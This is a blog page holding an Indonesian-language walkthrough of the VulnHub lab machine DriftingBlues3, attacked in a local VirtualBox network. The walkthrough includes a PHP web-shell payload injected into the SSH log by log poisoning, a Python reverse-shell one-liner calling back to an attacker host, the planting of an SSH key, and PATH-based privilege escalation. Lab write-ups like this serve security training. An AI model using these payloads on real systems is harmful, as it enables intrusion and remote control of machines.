<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Driftingblues3 - VULNHHUB | xf0lt</title>
<meta name=keywords content><meta name=description content="DISCLAIMER Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only."><meta name=author content="Me"><link rel=canonical href=http://localhost:1313/posts/heheh/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/heheh/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Driftingblues3 - VULNHHUB"><meta property="og:description" content="DISCLAIMER Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/heheh/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-02T18:03:03+07:00"><meta property="article:modified_time" content="2024-05-02T18:03:03+07:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Driftingblues3 - VULNHHUB"><meta name=twitter:description content="DISCLAIMER Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Driftingblues3 - VULNHHUB","item":"http://localhost:1313/posts/heheh/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Driftingblues3 - VULNHHUB","name":"Driftingblues3 - VULNHHUB","description":"DISCLAIMER Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.","keywords":[],"articleBody":" DISCLAIMER Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.\nim play machine in virtualbox, so first steb for indentify machine is run the netdiscover sudo netdiscover -i vboxnet0\nCurrently scanning: 172.16.126.0/16 | Screen View: Unique Hosts 2 Captured ARP Req/Rep packets, from 2 hosts. Total size: 84 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.56.100 08:00:27:10:2a:e9 1 42 PCS Systemtechnik GmbH 192.168.56.118 08:00:27:ef:74:97 1 42 PCS Systemtechnik GmbH ip 192.168.56.118 adalah korban, jadi untuk kedepan kita akan menyerang alamat ip tersebut, oke lets go!\nsetelah kita mengetahui alamat ip korban, langkah selanjutnya adalah melakukan portscanning yang bertujuan untuk melihat port mana saja yang terbuka dan memungkinkan untuk kita serang.\nNMAP -\u003e nmap -sCV -Pn 192.168.56.118 -o nmap.log Nmap scan report for 192.168.56.118 Host is up (0.0060s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA) | 256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA) |_ 256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Site doesn't have a title (text/html). | http-robots.txt: 1 disallowed entry |_/eventadmins |_http-server-header: Apache/2.4.38 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel # Nmap done at Sat Apr 27 14:19:40 2024 -- 1 IP address (1 host up) scanned in 20.54 seconds terlihat di atas ada dua port terbuka 22 dan 80. pertama kita fokus pada port 80. setelah pemeriksaan pada web tidak ada yang menarik, yang mana hanya menampilkan sebuah poster event dan performance acara karena pada tampilan web tidak ada yang menarik, jadi saya akan mencoba serangan bruteforce pada directory menggunakan tools gobuster.\nGOBUSTER gobuster dir -u http://192.168.56.118 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.56.118 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /privacy (Status: 301) [Size: 318] [--\u003e http://192.168.56.118/privacy/] /drupal (Status: 301) [Size: 317] [--\u003e http://192.168.56.118/drupal/] /secret (Status: 301) [Size: 317] [--\u003e http://192.168.56.118/secret/] /Makefile (Status: 200) [Size: 11] /wp-admin (Status: 301) [Size: 319] [--\u003e http://192.168.56.118/wp-admin/] /phpmyadmin (Status: 301) [Size: 321] [--\u003e http://192.168.56.118/phpmyadmin/] /server-status (Status: 403) [Size: 279] /robots.txt (Status: 200) [Size: 37] Progress: 220561 / 220562 (100.00%) =============================================================== Finished dari hasil gobuster terlihat kita menemukan bebebrapa direktori dan file menarik pada file robots.txt yang kita cek terdapat directory /eventadmins maka saya akan mengeceknya, apakah ada sesuatu disana.\npada direktory eventadmins kita diberitahu sebuah peringatan seperti ssh beracun, dan kita juga diberi tahu untuk mengecek file /littlequeenofspades.html juga.\nyang saya lihat pada file /littlequeenofspades.html terlihat seperti sebuah lirik, akan tetapi ketika saya select semua teks seperti terdapat code yang tersembunyi. jadi saya mencoba untuk melihat sourcode pada halaman tersebut dan ternyata benar ada code base64 yang disembunyikan setelah saya mengetahui code tersebut maka langkah selanjutnya adlah mengencode code tersebut seperti ini.\nENCODE -\u003e echo \"aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==\" | base64 -d ntruder? L2FkbWluc2ZpeGl0LnBocA== -\u003e echo \"L2FkbWluc2ZpeGl0LnBocA==\" | base64 -d adminsfixit.php dari hasil encode kita mendapatkan output sebuah file adminsfixit.php yang perlu kita cek\nseperti yang terlihat pada file adminsfixit.php terdapat sebuah log auth ssh yang memungkinkan untuk dieksploitasi. untuk cara exploitasi mungkin bisa menggunakan referensi ini. tetapi untuk kasus saya ini tidak berjalan dengan baik. jadi saya menggunakan cara lain seperti referensi ini. kemudian saya menjalan kan command\nCMD -\u003e nc 192.168.56.118 22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 /\u003c?php system($_GET['cmd']); ?\u003e Protocol mismatch. setelah saya jalankan comaand itu lalu saya menoba mengujinya pada url dengan command http://192.168.56.118/adminsfixit.php?cmd=ls dapat dilihat saya berhasil menginputkan comand pada url\nkemudian saya mencaoba untuk masuk sebagai shell, maka saya akan mencoba mengenerate shell menggunakan layanan sebuah web ini., saya mencoba semua command nc, php, bash tetapi tidak ada yang berjalan selain python. commandnya adalah seperti yang dibawah ini, ubah alamat ip sesui milik kalian.\nREVERSHELL python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' sebelum menjalankan command diatas jalan terlebih dahulu comand netcat agar terhubung dengan shell. nc -lvnp SHELL dan terlihat sekarang kita terhubung sebagai shell www-data\nkemudian saya coba lihat berapa user menggunakan command ls /home yang saya temukan hanya satu user saja. lalu saya berpindah kedirectory /home/robertj dan menjalan perintah ls -al untuk melihat isi yang lebih detail, dan saya melihat ada file user.txt namum setelah saya coba liat outputnya tidak mendapatkan hak access. jadi saya mencoba untuk masuk kedirektory .ssh dan menjalankan perintah ls -al lagi untuk melihatnya namun saya tidak menemukan apapun disana. SSH-KEYGEN jadi saya mencoba ssh-keygen pada machine local saya disini kita dibuatkan dua file id_rsa private dan public. setelah itu saya transfer file drift.pub ke mesin korban mengunakan python seerver dengan perintah python3 -m http.server dengan port 8000, kemudian saya ambil file pada mesin korban menggunakan wget. kemudian ubah nama drift.pub menjadi authorized_keys dan jalankan command chmod 600 pada untuk drift di mesin lokal untuk mendapatkan izin. lalu kita coba ssh mesin korban dengan command ssh -i drift robertj@IPdan yeah kita terkoneksi. saya banyak melakukan previlege-escalation akan tetapi saya menemukan sesuatu yang menarik untuk dilihat lebih dalam, ketika saya menjalankan perintah find / -user root -perm /4000 2\u003e/dev/null ada perintah /usr/bin/getinfo yang kemungkinan rentan. seperti yang dapat dilihat kita mendapatkan informasi seprti IP,hostname,os\nUntuk peningkatan hak istimewa ke ROOT, saya menggunakan metode penyalahgunaan $PATH. Anda dapat membaca detail tentang metode ini secara detail\nuntuk mendaptkan root saya melakukan command seperti dibawah terima kasih sudah membaca!\nkeep hacking! ","wordCount":"950","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-05-02T18:03:03+07:00","dateModified":"2024-05-02T18:03:03+07:00","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/heheh/"},"publisher":{"@type":"Organization","name":"xf0lt","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="xf0lt-blog (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>xf0lt-blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Driftingblues3 - VULNHHUB</h1><div class=post-meta><span title='2024-05-02 18:03:03 +0700 WIB'>May 2, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;950 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/heheh.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p><img loading=lazy src=/img/driftingblues/driftingblues3.png alt=image></p><h3 id=disclaimer><strong>DISCLAIMER</strong><a hidden class=anchor aria-hidden=true href=#disclaimer>#</a></h3><blockquote><p>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.</p></blockquote><hr><h3 id=im-play-machine-in-virtualbox-so-first-steb-for-indentify-machine-is-run-the-netdiscover>im play machine in virtualbox, so first steb for indentify machine is run the netdiscover<a hidden class=anchor aria-hidden=true href=#im-play-machine-in-virtualbox-so-first-steb-for-indentify-machine-is-run-the-netdiscover>#</a></h3><p><code>sudo netdiscover -i vboxnet0</code></p><pre tabindex=0><code> Currently scanning: 172.16.126.0/16   |   Screen View: Unique Hosts

 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.100  08:00:27:10:2a:e9      1      42  PCS Systemtechnik GmbH
 192.168.56.118  08:00:27:ef:74:97      1      42  PCS Systemtechnik GmbH
</code></pre><p>ip <code>192.168.56.118</code> adalah korban, jadi untuk kedepan kita akan menyerang alamat ip tersebut, oke lets go!</p><p>setelah kita mengetahui alamat ip korban, langkah selanjutnya adalah melakukan portscanning yang bertujuan untuk melihat port mana saja yang terbuka dan memungkinkan untuk kita serang.</p><h3 id=nmap>NMAP<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><pre tabindex=0><code>-&gt; nmap -sCV -Pn 192.168.56.118 -o nmap.log 
Nmap scan report for 192.168.56.118
Host is up (0.0060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn&#39;t have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
# Nmap done at Sat Apr 27 14:19:40 2024 -- 1 IP address (1 host up) scanned in 20.54 seconds
</code></pre><p>terlihat di atas ada dua port terbuka 22 dan 80. pertama kita fokus pada port 80.
setelah pemeriksaan pada web tidak ada yang menarik, yang mana hanya menampilkan sebuah poster event dan performance acara
<img loading=lazy src=/img/driftingblues/port-80.png alt=image>
<img loading=lazy src=/img/driftingblues/port-80-2.png alt=image></p><p>karena pada tampilan web tidak ada yang menarik, jadi saya akan mencoba serangan bruteforce pada directory menggunakan tools gobuster.</p><h3 id=gobuster>GOBUSTER<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><pre tabindex=0><code>gobuster dir -u http://192.168.56.118 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/privacy              (Status: 301) [Size: 318] [--&gt; http://192.168.56.118/privacy/]
/drupal               (Status: 301) [Size: 317] [--&gt; http://192.168.56.118/drupal/]
/secret               (Status: 301) [Size: 317] [--&gt; http://192.168.56.118/secret/]
/Makefile             (Status: 200) [Size: 11]
/wp-admin             (Status: 301) [Size: 319] [--&gt; http://192.168.56.118/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.118/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
/robots.txt           (Status: 200) [Size: 37]
Progress: 220561 / 220562 (100.00%)
===============================================================
Finished
</code></pre><p>dari hasil gobuster terlihat kita menemukan bebebrapa direktori dan file menarik
<img loading=lazy src=/img/driftingblues/robots-txt.png alt=image>
pada file robots.txt yang kita cek terdapat directory <code>/eventadmins</code> maka saya akan mengeceknya, apakah ada sesuatu disana.</p><p>pada direktory <code>eventadmins</code> kita diberitahu sebuah peringatan seperti ssh beracun, dan kita juga diberi tahu untuk mengecek file <code>/littlequeenofspades.html</code> juga.</p><p>yang saya lihat pada file <code>/littlequeenofspades.html</code> terlihat seperti sebuah lirik, akan tetapi ketika saya select semua teks seperti terdapat code yang tersembunyi.
<img loading=lazy src=/img/driftingblues/little-quen.png alt=image>
<img loading=lazy src=/img/driftingblues/little-quen-2.png alt=image></p><p>jadi saya mencoba untuk melihat sourcode pada halaman tersebut dan ternyata benar ada code <code>base64</code> yang disembunyikan
<img loading=lazy src=/img/driftingblues/ctrl-u.png alt=image></p><p>setelah saya mengetahui code tersebut maka langkah selanjutnya adlah mengencode code tersebut seperti ini.</p><h3 id=encode>ENCODE<a hidden class=anchor aria-hidden=true href=#encode>#</a></h3><pre tabindex=0><code>-&gt; echo &#34;aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==&#34; | base64 -d
ntruder? L2FkbWluc2ZpeGl0LnBocA==
-&gt; echo &#34;L2FkbWluc2ZpeGl0LnBocA==&#34; | base64 -d
adminsfixit.php
</code></pre><p>dari hasil encode kita mendapatkan output sebuah file <code>adminsfixit.php</code> yang perlu kita cek</p><p><img loading=lazy src=/img/driftingblues/ssh-log.png alt=image>
seperti yang terlihat pada file <code>adminsfixit.php</code> terdapat sebuah log auth ssh yang memungkinkan untuk dieksploitasi. untuk cara exploitasi mungkin bisa menggunakan referensi <a href=https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern>ini.</a> tetapi untuk kasus saya ini tidak berjalan dengan baik. jadi saya menggunakan cara lain seperti referensi <a href=https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning>ini.</a> kemudian saya menjalan kan command</p><h3 id=cmd>CMD<a hidden class=anchor aria-hidden=true href=#cmd>#</a></h3><pre tabindex=0><code>-&gt; nc 192.168.56.118 22
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
/&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
Protocol mismatch.
</code></pre><p>setelah saya jalankan comaand itu lalu saya menoba mengujinya pada url dengan command <code>http://192.168.56.118/adminsfixit.php?cmd=ls</code> dapat dilihat saya berhasil menginputkan comand pada url</p><p><img loading=lazy src=/img/driftingblues/cmd.png alt=image></p><p>kemudian saya mencaoba untuk masuk sebagai shell, maka saya akan mencoba mengenerate shell menggunakan layanan sebuah web <a href=https://www.revshells.com/>ini.</a>, saya mencoba semua command <code>nc, php, bash</code> tetapi tidak ada yang berjalan selain python. commandnya adalah seperti yang dibawah ini, ubah alamat ip sesui milik kalian.</p><h3 id=revershell>REVERSHELL<a hidden class=anchor aria-hidden=true href=#revershell>#</a></h3><pre tabindex=0><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;IP&gt;&#34;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>sebelum menjalankan command diatas jalan terlebih dahulu comand <code>netcat</code> agar terhubung dengan shell.
<code>nc -lvnp &lt;PORT></code></p><h3 id=shell>SHELL<a hidden class=anchor aria-hidden=true href=#shell>#</a></h3><p><img loading=lazy src=https://i.imgur.com/VqaHqjb.png alt=image></p><p>dan terlihat sekarang kita terhubung sebagai shell <code>www-data</code></p><p>kemudian saya coba lihat berapa user menggunakan command <code>ls /home</code> yang saya temukan hanya satu user saja.
<img loading=lazy src=https://i.imgur.com/i8LE7uh.png alt=image></p><p>lalu saya berpindah kedirectory <code>/home/robertj</code> dan menjalan perintah <code>ls -al</code> untuk melihat isi yang lebih detail, dan saya melihat ada file <code>user.txt</code> namum setelah saya coba liat outputnya tidak mendapatkan hak access. jadi saya mencoba untuk masuk kedirektory <code>.ssh</code> dan menjalankan perintah <code>ls -al</code> lagi untuk melihatnya namun saya tidak menemukan apapun disana.
<img loading=lazy src=https://i.imgur.com/h26z1zf.png alt=image></p><h3 id=ssh-keygen>SSH-KEYGEN<a hidden class=anchor aria-hidden=true href=#ssh-keygen>#</a></h3><p>jadi saya mencoba <code>ssh-keygen</code> pada machine local saya
<img loading=lazy src=https://i.imgur.com/HRcVDTf.png alt=image></p><p>disini kita dibuatkan dua file id_rsa private dan public. setelah itu saya transfer file <code>drift.pub</code> ke mesin korban mengunakan python seerver dengan perintah <code>python3 -m http.server</code> dengan port <code>8000</code>, kemudian saya ambil file pada mesin korban menggunakan <code>wget</code>.
<img loading=lazy src=https://i.imgur.com/Hik4zp2.png alt=image></p><p>kemudian ubah nama <code>drift.pub</code> menjadi <code>authorized_keys</code> dan jalankan command <code>chmod 600</code> pada untuk <code>drift</code> di mesin lokal untuk mendapatkan izin. lalu kita coba ssh mesin korban dengan command <code>ssh -i drift robertj@IP</code>dan yeah kita terkoneksi.
<img loading=lazy src=https://i.imgur.com/8fG3Mr2.png alt=image></p><p>saya banyak melakukan previlege-escalation akan tetapi saya menemukan sesuatu yang menarik untuk dilihat lebih dalam, ketika saya menjalankan perintah <code>find / -user root -perm /4000 2>/dev/null</code> ada perintah <code>/usr/bin/getinfo</code> yang kemungkinan rentan.
<img loading=lazy src=https://i.imgur.com/nG1abjP.png alt=image>
<img loading=lazy src=https://i.imgur.com/3BXMyfg.png alt=image></p><p>seperti yang dapat dilihat kita mendapatkan informasi seprti <code>IP,hostname,os</code></p><p>Untuk peningkatan hak istimewa ke ROOT, saya menggunakan metode penyalahgunaan $PATH. Anda dapat membaca detail tentang metode ini secara <a href=https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/>detail</a></p><p>untuk mendaptkan root saya melakukan command seperti dibawah
<img loading=lazy src=https://i.imgur.com/x8eDQua.png alt=image>
<img loading=lazy src=https://i.imgur.com/8ovbDHG.png alt=iamge></p><p>terima kasih sudah membaca!</p><h3 id=keep-hacking>keep hacking!<a hidden class=anchor aria-hidden=true href=#keep-hacking>#</a></h3></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=http://localhost:1313/posts/tester5/><span class=title>Next »</span><br><span>Tester5</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on x" href="https://x.com/intent/tweet/?text=Driftingblues3%20-%20VULNHHUB&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f&amp;title=Driftingblues3%20-%20VULNHHUB&amp;summary=Driftingblues3%20-%20VULNHHUB&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f&title=Driftingblues3%20-%20VULNHHUB"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Driftingblues3 - VULNHHUB on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fheheh%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path 